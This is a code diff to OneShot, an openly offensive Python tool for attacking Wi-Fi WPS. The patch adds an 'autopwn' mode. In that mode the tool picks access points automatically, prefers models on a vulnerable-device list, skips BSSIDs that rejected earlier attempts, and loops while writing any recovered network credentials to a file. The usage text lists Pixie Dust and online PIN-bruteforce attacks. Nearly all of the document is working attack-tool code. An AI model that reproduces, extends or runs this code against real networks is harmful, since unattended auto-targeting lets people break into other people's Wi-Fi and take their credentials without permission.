@@ -17,6 +17,9 @@ import csv
 from pathlib import Path
 from typing import Dict
 
+#Auto Mode Hack: Global variable wasted_bssids
+wasted_bssids = []
+
 
 class NetworkAddress:
     def __init__(self, mac):
@@ -470,6 +473,7 @@ class Companion:
         if not verbose:
             verbose = self.print_debug
         line = self.wpas.stdout.readline()
+        
         if not line:
             self.wpas.wait()
             return False
@@ -533,8 +537,8 @@ class Companion:
         elif ('WPS-FAIL' in line) and (self.connection_status.status != ''):
             self.connection_status.status = 'WPS_FAIL'
             print('[-] wpa_supplicant returned WPS-FAIL')
-#        elif 'NL80211_CMD_DEL_STATION' in line:
-#            print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
+        #elif 'NL80211_CMD_DEL_STATION' in line:
+            #print("[!] Unexpected interference — kill NetworkManager/wpa_supplicant!")
         elif 'Trying to authenticate with' in line:
             self.connection_status.status = 'authenticating'
             if 'SSID' in line:
@@ -670,6 +674,8 @@ class Companion:
             if not res:
                 break
             if self.connection_status.status == 'WSC_NACK':
+                print ('[i] Adding to Wasted BSSIDs:', bssid)
+                wasted_bssids.append(bssid)
                 break
             elif self.connection_status.status == 'GOT_PSK':
                 break
@@ -853,6 +859,7 @@ class WiFiScanner:
 
     def iw_scanner(self) -> Dict[int, dict]:
         """Parsing iw scan results"""
+        self.auto_bssid = None
         def handle_network(line, result, networks):
             networks.append(
                     {
@@ -974,6 +981,8 @@ class WiFiScanner:
                     text = '\033[91m{}\033[00m'.format(text)
                 elif color == 'yellow':
                     text = '\033[93m{}\033[00m'.format(text)
+                elif color == 'grey':
+                    text = '\033[90m{}\033[00m'.format(text)
                 else:
                     return text
             else:
@@ -981,11 +990,12 @@ class WiFiScanner:
             return text
 
         if self.vuln_list:
-            print('Network marks: {1} {0} {2} {0} {3}'.format(
+            print('Network marks: {1} {0} {2} {0} {3} {0} {4}'.format(
                 '|',
                 colored('Possibly vulnerable', color='green'),
                 colored('WPS locked', color='red'),
-                colored('Already stored', color='yellow')
+                colored('Already stored', color='yellow'),
+                colored('Wasted', color='grey')
             ))
         print('Networks list:')
         print('{:<4} {:<18} {:<25} {:<8} {:<4} {:<27} {:<}'.format(
@@ -1006,12 +1016,18 @@ class WiFiScanner:
                 )
             if (network['BSSID'], network['ESSID']) in self.stored:
                 print(colored(line, color='yellow'))
+            elif (network['BSSID']) in wasted_bssids:
+                print(colored(line, color='grey'))    
             elif network['WPS locked']:
                 print(colored(line, color='red'))
             elif self.vuln_list and (model in self.vuln_list):
                 print(colored(line, color='green'))
+                if self.auto_bssid is None:
+                    self.auto_bssid = network['BSSID']
             else:
                 print(line)
+                if self.auto_bssid is None:
+                    self.auto_bssid = network['BSSID']
 
         return network_list
 
@@ -1021,6 +1037,8 @@ class WiFiScanner:
             print('[-] No WPS networks found.')
             return
         while 1:
+            if args.auto and self.auto_bssid is not None:
+                return self.auto_bssid
             try:
                 networkNo = input('Select target (press Enter to refresh): ')
                 if networkNo.lower() in ('r', '0', ''):
@@ -1053,36 +1071,37 @@ def die(msg):
 
 def usage():
     return """
-OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg
+    OneShotPin 0.0.2 (c) 2017 rofl0r, modded by drygdryg
 
-%(prog)s <arguments>
+    %(prog)s <arguments>
 
-Required arguments:
-    -i, --interface=<wlan0>  : Name of the interface to use
+    Required arguments:
+        -i, --interface=<wlan0>  : Name of the interface to use
 
-Optional arguments:
-    -b, --bssid=<mac>        : BSSID of the target AP
-    -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
-    -K, --pixie-dust         : Run Pixie Dust attack
-    -B, --bruteforce         : Run online bruteforce attack
-    --push-button-connect    : Run WPS push button connection
+    Optional arguments:
+        -b, --bssid=<mac>        : BSSID of the target AP
+        -p, --pin=<wps pin>      : Use the specified pin (arbitrary string or 4/8 digit pin)
+        -K, --pixie-dust         : Run Pixie Dust attack
+        -A, --auto               : Try autopwn
+        -B, --bruteforce         : Run online bruteforce attack
+        --push-button-connect    : Run WPS push button connection
 
-Advanced arguments:
-    -d, --delay=<n>          : Set the delay between pin attempts [0]
-    -w, --write              : Write AP credentials to the file on success
-    -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
-    -X, --show-pixie-cmd     : Always print Pixiewps command
-    --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
-    --iface-down             : Down network interface when the work is finished
-    -l, --loop               : Run in a loop
-    -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
-    --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
-                               (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
-    -v, --verbose            : Verbose output
+    Advanced arguments:
+        -d, --delay=<n>          : Set the delay between pin attempts [0]
+        -w, --write              : Write AP credentials to the file on success
+        -F, --pixie-force        : Run Pixiewps with --force option (bruteforce full range)
+        -X, --show-pixie-cmd     : Always print Pixiewps command
+        --vuln-list=<filename>   : Use custom file with vulnerable devices list ['vulnwsc.txt']
+        --iface-down             : Down network interface when the work is finished
+        -l, --loop               : Run in a loop
+        -r, --reverse-scan       : Reverse order of networks in the list of networks. Useful on small displays
+        --mtk-wifi               : Activate MediaTek Wi-Fi interface driver on startup and deactivate it on exit
+                                (for internal Wi-Fi adapters implemented in MediaTek SoCs). Turn off Wi-Fi in the system settings before using this.
+        -v, --verbose            : Verbose output
 
-Example:
-    %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
-"""
+    Example:
+        %(prog)s -i wlan0 -b 00:90:4C:C1:AC:21 -K
+    """
 
 
 if __name__ == '__main__':
@@ -1123,6 +1142,11 @@ if __name__ == '__main__':
         '-X', '--show-pixie-cmd',
         action='store_true',
         help='Always print Pixiewps command'
+        )
+    parser.add_argument(
+        '-A', '--auto',
+        action='store_true',
+        help='Autopwn'
         )
     parser.add_argument(
         '-B', '--bruteforce',
@@ -1192,6 +1216,11 @@ if __name__ == '__main__':
                 "/dev/wmtWifi does not exist or it is not a character device")
         wmtWifi_device.chmod(0o644)
         wmtWifi_device.write_text("1")
+
+    # Set loop and write flags if auto mode is activated
+    if args.auto:
+        args.loop = True
+        args.write = True
 
     if not ifaceUp(args.interface):
         die('Unable to up interface "{}"'.format(args.interface))
